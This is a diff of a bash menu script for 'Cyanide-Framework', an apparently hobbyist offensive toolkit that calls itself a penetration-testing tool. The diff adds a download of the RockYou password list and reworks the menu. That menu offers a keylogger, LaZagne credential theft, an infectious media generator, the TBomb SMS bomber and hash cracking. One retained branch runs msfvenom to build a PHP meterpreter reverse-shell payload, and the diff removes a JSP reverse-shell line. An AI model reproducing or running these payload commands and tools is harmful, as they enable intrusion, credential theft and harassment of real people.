@@ -1,4 +1,4 @@
-#!/usr/bin/env bash
+ #!/usr/bin/env bash
 
 resize -s 80 100 > /dev/null 
 
@@ -112,6 +112,31 @@ clear
 echo -e $blue "[ ✔ ] Done installing .... "
 which figlet > /dev/null 2>&1
 fi
+# checking for Rockyou dictionary
+check_zip=/usr/share/wordlists/rockyou.txt.gz
+check_txt=/usr/share/wordlists/rockyou.txt
+
+if test -f "$check_zip"; then
+  echo -e $yellow "[ ! ] Unzipping Rockyou "
+  echo -e $green "[ ✔ ] Rockyou Zip.......................${LighGreenF}[ found ]"
+  sleep 1
+  gunzip /usr/share/wordlists/rockyou.txt.gz
+  sleep 2
+elif test -f "$check_txt"; then
+  echo -e $green "[ ✔ ] Rockyou...........................${LighGreenF}[ found ]"
+  sleep 2
+else
+  echo -e $red "[ X ] Rockyou -> ${RedF}not found! "
+  echo -e $yellow "[ ! ] Installing Rockyou "
+  sleep 1
+
+  xterm -T "INSTALLING ROCKYOU" -fa monaco -fs 10 -bg red -e "cd /usr/share/wordlists; wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
+  sleep 2
+  echo -e $green "[ ✔ ] Rockyou.......................${LighGreenF}[ installed ]"
+  sleep 2
+fi
+
+
 # To start service for posrgresql
 function postgresql_start()
 {
@@ -132,14 +157,14 @@ banner() {
         figlet Cyanide-Framework
     fi
     if ! [ -x "$(command -v toilet)" ]; then
-        echo -e "\e[4;34m This Framework Was Created By \e[1;32mCyanide & Dboidembla\e[0m"
+        echo -e "\e[4;34m This Framework Was Created By \e[1;32mCyanide \e[0m"
     # else
     #     echo -e "\e[1;34mCreated By \e[1;34m"
     #     toilet -f mono12 -F border Cyanide-Framework
     fi
     echo -e "\e[1;34m For Any Queries Join Me!!!\e[0m"
-    echo -e "\e[1;32m Telegram: XXXX \e[0m"
-    echo -e "\e[4;32m YouTube: https://bit.ly/35YqryS \e[0m"
+    echo -e "\e[1;32m Telegram : https://bit.ly/365XS2N \e[0m"
+    echo -e "\e[4;32m YouTube  : https://bit.ly/35YqryS \e[0m"
     echo " "
 
 }
@@ -326,21 +351,21 @@ main(){
 
   echo -e $red "╔────────────────────────────────────────────────╗"
   echo -e $red "|            Cyanide Framework v0.2              |"
-  echo -e $red "|  [ x ] Tool For Penetration Testing     [ x ]  |"
+  echo -e $red "|  [ x ]   Tool For Penetration Testing   [ x ]  |"
   echo -e $red "|              watch your back                   |"           
   echo -e $red "┖────────────────────────────────────────────────┙"
 
   echo -e $red "[ 1  ] Network Based Attacks"
-  echo -e $red "[ 2  ]  Web Based Attacks"
+  echo -e $red "[ 2  ] Web Based Attacks"
   echo -e $red "[ 3  ] Keylogger"
   echo -e $red "[ 4  ] Payload Genetator"
   echo -e $red "[ 5  ] LaZagne"
   echo -e $red "[ 6  ] Infectious Media Genetator"
   echo -e $red "[ 7  ] TBomb"
-  echo -e $red "[ 8  ] Md5 Hash Generator"
-  echo -e $red "[ 9  ] md5 Hash Cracker"
+  echo -e $red "[ 8  ] Hash & Cipher Generator"
+  echo -e $red "[ 9  ] Hash & Cipher Decoder"
   echo -e $red "[ 10 ] IP Locator"
-  echo -e $red "[ 11 ] Quit" 
+  echo -e $red "[ 99 ] Quit" 
   echo -e $red    "..............................."
   echo -e $yellow "Please select your option:"
 user_input
@@ -351,15 +376,24 @@ user_input(){
 re='[a-zA-Z]'
  echo -e $GreenF "..............................."
  read -p "[ → ] Enter Choice> : " Number
- if [ $Number -gt 11 ] || [ $Number -lt 1 ] || [[ "$Number" =~ $re ]];
+ if [ $Number -gt 11 ] || [ $Number -lt 1 ] || [[ "$Number" =~ $re ]] ;
   then
-   echo -e $red    "[ x ].......................................[ x ]"
-   echo -e $RedF "You choose invalid option Please try again."
-   echo -e $yellow "[*] Thanks For using Cyanide-Framework  :)"
-   sleep 3
-   # exit 1
-   clear
-   main
+   if [ $Number == 99 ];
+   then
+      cases_of_framework
+   else
+    echo -e $red    "[ x ].......................................[ x ]"
+    echo -e $RedF "Oops! You have selected an invalid option."
+    echo ""
+    echo -e $yellow "[*] Please select a valid option :)"
+    echo ""
+    sleep 2
+    # exit 1
+    clear
+    main
+   fi
+ else
+   cases_of_framework
 
  fi
 }
@@ -368,9 +402,11 @@ cases_of_framework(){
 case $Number in 
  Network|network|N|n|1) 
   echo -e $GreenF "[*]....................................[*]"
-  echo -e $blue " 1. Mac_changer"
-  echo -e $blue " 2. Wireless_hacking"
-  echo -e $blue " 3. TBomb"
+  echo -e $blue " [ 1 ] Mac_changer"
+  echo -e $blue " [ 2 ] Wireless_hacking"
+  echo -e $blue " [ 3 ] TBomb"
+  echo ""
+  echo -e $red  " [ 99 ] Return to main menu"
   echo -e $GreenF "[ ✔ ]....................................[ ✔ ]"
   echo -e $red    "..............................."
   echo -e $yellow "Select your option:"
@@ -380,19 +416,28 @@ case $Number in
  read -p "[ → ] Enter choice> : " number_option
  if [ $number_option -gt 3 ] || [ $number_option -lt 1 ] || [[ "$number_option" =~ $re ]];
   then
-   echo -e $red    "[ x ].................................................[ x ]"
-   echo -e $red    "[ x ].................................................[ x ]"
-   echo -e $RedF "     [ X ] You choose invalid option Please try again [ X ]."
-   echo -e $red    "[ x ].................................................[ x ]"
+    if [ $number_option -eq 99 ];
+    then
+      main
+    else
+      echo -e $red    "[ x ].................................................[ x ]"
+      echo -e $RedF "     [ X ]         You choose invalid option.          [ X ]"
+      echo -e $red    "[ x ].................................................[ x ]"
+      echo -e $RedF "     [ X ]              Please try again                 [ X ]"
+      echo -e $red    "[ x ].................................................[ x ]"
    # echo -e $yellow "[*] Thanks For using Cyanide-Framework  :)"
-   sleep 3
-   clear
-   main
-   # exit 1
- elif [ $number_option == 1 ];
-   then
+      sleep 2
+      clear
+      cases_of_framework
+   fi
+ else
+  case $number_option in
+    1)
     python3 mac_changer.py
-    exit   
+    exit
+    ;;
+  esac
+
 
  fi
   ;;
@@ -409,7 +454,7 @@ case $Number in
 
   Payload|payload|P|p|4)
   payload_generator
- ;;
+  ;;
   
   LaZagne|lazagne|L|l|5)
   msfvenom -p php/meterpreter_reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw > $pwd/$filename.php
@@ -418,9 +463,7 @@ case $Number in
   ;;
 
   Infectious|infectious|6)
-  msfvenom -p java/jsp_shell_reverse_tcp LHOST="lhost" LPORT="$lport" -f raw > $pwd/$filename.jsp 
-  payload=java/jsp_shell_reverse_tcp
-  echo " Your Payload has been generated successfully in $pwd directory"
+  
   ;;
 
   TBomb|tbomb|T|t|7)
@@ -442,7 +485,12 @@ case $Number in
   python3 phoneTracker.py
   ;;
 
-  11)  echo -e $yellow " Good Bye !!"
+  99)  echo -e $red "      Quiting"
+       sleep 2
+       echo ""
+       echo -e $yellow "   Thanks for using Cyanide-Framework"
+       echo ""
+       echo -e $yellow "   Good Bye !!"  
                 # apache_svc_stop
                 # postgresql_stop
                 echo
